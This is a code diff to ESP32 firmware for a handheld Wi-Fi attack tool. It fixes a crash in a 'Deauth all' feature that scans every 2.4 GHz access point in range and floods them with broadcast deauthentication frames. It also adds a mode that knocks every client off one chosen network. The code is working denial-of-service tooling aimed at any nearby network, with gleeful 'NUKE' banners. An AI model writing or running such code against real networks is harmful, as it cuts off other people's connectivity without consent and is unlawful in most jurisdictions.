@@ -12,6 +12,7 @@
 #include "c5_cmd.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <esp_heap_caps.h>
 
 /* ========== Broadcast deauth: nuke every AP in range ========== */
 
@@ -73,18 +74,47 @@ static void broad_task(void *)
 static void db_scan_populate(void)
 {
     s_b_target_n = 0;
-    int n = WiFi.scanNetworks(false, true, false, 120);
-    if (n > 0) {
-        for (int i = 0; i < n && s_b_target_n < DB_MAX_APS; ++i) {
-            db_target_t &t = s_b_targets[s_b_target_n++];
-            memcpy(t.bssid, WiFi.BSSID(i), 6);
-            t.channel = WiFi.channel(i);
-            strncpy(t.ssid, WiFi.SSID(i).c_str(), sizeof(t.ssid) - 1);
-            t.ssid[sizeof(t.ssid) - 1] = '\0';
-            t.is_5g = false;   /* S3 WiFi.scan never returns 5 GHz anyway */
+    /* ROOT-CAUSE FIX 2026-06-09 (serial backtrace):
+     * WiFi.scanNetworks() is Arduino's API — it calls
+     * WiFiGenericClass::enableSTA → wifiLowLevelInit →
+     * esp_netif_create_default_wifi_sta(). But wifi_lean_sta_init()
+     * already created the default STA netif via raw IDF. Arduino has
+     * no idea that netif exists, so it tries to create a DUPLICATE
+     * and the IDF asserts:
+     *   "esp_netif_create_default_wifi_sta ... duplicate key"
+     * -> instant panic-reboot. This was THE Deauth-All crash, on both
+     * the AP-select 'X' route and the direct WiFi-menu route.
+     *
+     * Fix: scan via raw esp_wifi_scan_start (blocking) + raw
+     * esp_wifi_scan_get_ap_records — same pattern wifi_scan.cpp uses
+     * successfully. Never touch Arduino WiFi.* after raw-IDF init. */
+    wifi_scan_config_t scfg = {};
+    scfg.show_hidden          = true;
+    scfg.scan_type            = WIFI_SCAN_TYPE_ACTIVE;
+    scfg.scan_time.active.min = 80;
+    scfg.scan_time.active.max = 150;
+    esp_err_t scan_rc = esp_wifi_scan_start(&scfg, true);
+    uint16_t n_u = 0;
+    esp_wifi_scan_get_ap_num(&n_u);
+    if (scan_rc == ESP_OK && n_u > 0) {
+        uint16_t want = n_u < DB_MAX_APS ? n_u : DB_MAX_APS;
+        wifi_ap_record_t *recs = (wifi_ap_record_t *)heap_caps_malloc(
+            want * sizeof(wifi_ap_record_t), MALLOC_CAP_8BIT);
+        if (recs) {
+            uint16_t got = want;
+            if (esp_wifi_scan_get_ap_records(&got, recs) == ESP_OK) {
+                for (int i = 0; i < (int)got && s_b_target_n < DB_MAX_APS; ++i) {
+                    db_target_t &t = s_b_targets[s_b_target_n++];
+                    memcpy(t.bssid, recs[i].bssid, 6);
+                    t.channel = recs[i].primary;
+                    strncpy(t.ssid, (const char *)recs[i].ssid, sizeof(t.ssid) - 1);
+                    t.ssid[sizeof(t.ssid) - 1] = '\0';
+                    t.is_5g = false;   /* S3 scan never returns 5 GHz */
+                }
+            }
+            free(recs);
         }
     }
-    WiFi.scanDelete();
 
     /* If a C5/TRIDENT satellite is paired, fire off a 5 GHz scan over
      * ESP-NOW and wait a moment for RESP_AP frames to land. APs we get
@@ -122,38 +152,18 @@ static void db_scan_populate(void)
     }
 }
 
-void feat_wifi_deauth_broadcast(void)
+/* Shared arm-promisc + spawn-task + live NUKE dashboard. Targets must
+ * already be loaded into s_b_targets[0..s_b_target_n). headline picks
+ * the big banner: nullptr -> "NUKE LAUNCHED" (all-APs); else the AP
+ * name (single-target broadcast from the AP-detail X key). */
+static void run_broadcast_dashboard(const char *banner)
 {
-    radio_switch(RADIO_WIFI);
-    wifi_lean_sta_init();
-
     auto &d = M5Cardputer.Display;
-    ui_clear_body();
-    d.setTextColor(T_WARN, T_BG);
-    d.setCursor(4, BODY_Y + 2); d.print("NUKING ALL APs");
-    d.setTextColor(T_DIM, T_BG);
-    d.setCursor(4, BODY_Y + 20); d.print("scanning 2.4 GHz...");
-    ui_draw_footer("scanning");
-    ui_radar(SCR_W / 2, BODY_Y + 60, 24, T_ACCENT);
 
-    db_scan_populate();
-    if (s_b_target_n == 0) {
-        ui_toast("no APs found", T_BAD, 1500);
-        return;
-    }
-
-    /* Repro fix 2026-06-06: WiFi.scanNetworks can leave the driver in
-     * an inconsistent state — Arduino's scan internally toggles
-     * promisc / mode and on fresh-boot entries the post-scan state
-     * sometimes had WIFI_MODE_NULL by the time esp_wifi_set_promiscuous
-     * fires below. Re-assert MODE_STA + clear stale promisc before we
-     * arm our own. The wifi_lean_sta_init at the top already started
-     * the driver so a second set_mode is harmless. */
+    /* Re-assert STA mode + arm promisc. (Raw-IDF scan keeps the driver
+     * in STA throughout, so this is just belt-and-suspenders.) */
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_mode(WIFI_MODE_STA);
-    /* Explicit MASK_ALL — passing nullptr (or leaving default) silently
-     * disables capture on IDF 5.5 which on some builds also gates the
-     * raw 80211_tx hook. Match the wifi_deauth.cpp / triton.cpp pattern. */
     static const wifi_promiscuous_filter_t s_all_filter = {
         .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
     };
@@ -164,12 +174,9 @@ void feat_wifi_deauth_broadcast(void)
     s_b_cursor = 0;
     s_b_seq = (uint16_t)(esp_random() & 0x0FFF);
     s_b_running = true;
-    xTaskCreate(broad_task, "deauth_all", 3072, nullptr, 4, nullptr);
+    BaseType_t tc = xTaskCreate(broad_task, "deauth_all", 4096, nullptr, 4, nullptr);
+    if (tc != pdPASS) { ui_toast("task create failed", T_BAD, 1500); s_b_running = false; return; }
 
-    /* Permanent NUKE dashboard — the intro splash aesthetic kept as the
-     * live view. Glitch field + scan lines + 3x halo headline + bottom
-     * stats ribbon. Updates every 200 ms while frames fly. No more
-     * boring text-on-gradient dashboard under the splash. */
     uint32_t last = 0;
     uint32_t last_sent = 0;
     uint16_t color = T_ACCENT2;
@@ -181,16 +188,14 @@ void feat_wifi_deauth_broadcast(void)
             last = now;
             int cur = s_b_target_n ? (s_b_cursor % s_b_target_n) : 0;
 
-            /* Full redraw — cheap at 5 Hz and lets the glitch field
-             * actually flicker. */
             d.fillScreen(0x0000);
             ui_glitch(0, 0, SCR_W, SCR_H);
             for (int y = 0; y < SCR_H; y += 4) {
                 d.drawFastHLine(0, y, SCR_W, 0x0020);
             }
 
-            /* Big halo headline — same draw as ui_action_overlay. */
-            const char *headline = "NUKE LAUNCHED";
+            /* Big halo headline — caller-supplied banner. */
+            const char *headline = banner;
             d.setTextSize(3);
             int hw = d.textWidth(headline) * 3;
             int hx = (SCR_W - hw) / 2;
@@ -272,6 +277,57 @@ void feat_wifi_deauth_broadcast(void)
     s_b_running = false;
     delay(150);
     esp_wifi_set_promiscuous(false);
+}
+
+/* "Deauth all" — scan every 2.4 GHz AP in range and broadcast-deauth
+ * them all in rotation. Entry from the WiFi menu's 'Deauth all'. */
+void feat_wifi_deauth_broadcast(void)
+{
+    auto &d = M5Cardputer.Display;
+    ui_clear_body();
+    d.setTextColor(T_WARN, T_BG);
+    d.setCursor(4, BODY_Y + 2); d.print("NUKING ALL APs");
+    d.setTextColor(T_DIM, T_BG);
+    d.setCursor(4, BODY_Y + 20); d.print("scanning 2.4 GHz...");
+    ui_draw_footer("scanning");
+    ui_radar(SCR_W / 2, BODY_Y + 60, 24, T_ACCENT);
+
+    radio_switch(RADIO_WIFI);
+    if (!wifi_lean_sta_init()) { ui_toast("STA init failed", T_BAD, 1500); return; }
+
+    db_scan_populate();
+    if (s_b_target_n == 0) { ui_toast("no APs found", T_BAD, 1500); return; }
+
+    run_broadcast_dashboard("NUKE LAUNCHED");
+}
+
+/* "X" from the AP-detail screen — broadcast-deauth ONLY the selected
+ * AP (kick every client off that one network). Distinct from 'D'
+ * (feat_wifi_deauth, which broadcasts THIS AP *and* hunts its
+ * individual clients) and from the menu's Deauth-All (which nukes
+ * every AP in range). Previously this route mistakenly called the
+ * nuke-all path, so X and Deauth-All looked identical. */
+void feat_wifi_deauth_broadcast_ap(const ap_t &a)
+{
+    auto &d = M5Cardputer.Display;
+    ui_clear_body();
+    d.setTextColor(T_WARN, T_BG);
+    d.setCursor(4, BODY_Y + 2); d.printf("BCAST DEAUTH %.16s", a.ssid);
+    ui_draw_footer("ESC=stop");
+
+    radio_switch(RADIO_WIFI);
+    if (!wifi_lean_sta_init()) { ui_toast("STA init failed", T_BAD, 1500); return; }
+
+    /* Single target — skip the scan entirely. */
+    s_b_target_n = 0;
+    db_target_t &t = s_b_targets[s_b_target_n++];
+    memcpy(t.bssid, a.bssid, 6);
+    t.channel = a.channel;
+    strncpy(t.ssid, a.ssid, sizeof(t.ssid) - 1);
+    t.ssid[sizeof(t.ssid) - 1] = '\0';
+    t.is_5g = false;
+
+    run_broadcast_dashboard("KICKING");
 }
 
 /* ========== Deauth detector: passively count deauth frames ========== */
